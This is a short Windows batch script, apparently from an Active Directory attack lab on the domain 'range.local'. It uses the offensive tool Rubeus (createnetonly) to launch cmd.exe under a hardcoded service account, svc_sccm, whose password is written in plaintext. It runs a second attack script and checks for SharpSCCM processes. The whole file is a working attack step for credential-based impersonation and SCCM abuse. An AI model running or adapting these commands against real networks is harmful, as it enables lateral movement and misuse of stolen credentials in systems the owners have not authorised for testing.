@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
del /q C:\Tools\cadre-attack\cn-test.txt 2>nul
echo === CREATENETONLY (test v2) ===
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /args:"/c C:\Tools\cadre-attack\branchc-test.cmd" /username:svc_sccm /domain:range.local /password:s3rv1c3_SCCM!
echo === PROCESS CHECK ===
tasklist | findstr /i "cmd.exe SharpSCCM"
echo === WAIT 8s ===
ping -n 9 127.0.0.1 >nul
echo === PROCESS CHECK 2 ===
tasklist | findstr /i "cmd.exe SharpSCCM"
echo === RESULT ===
type C:\Tools\cadre-attack\cn-test.txt 2>&1
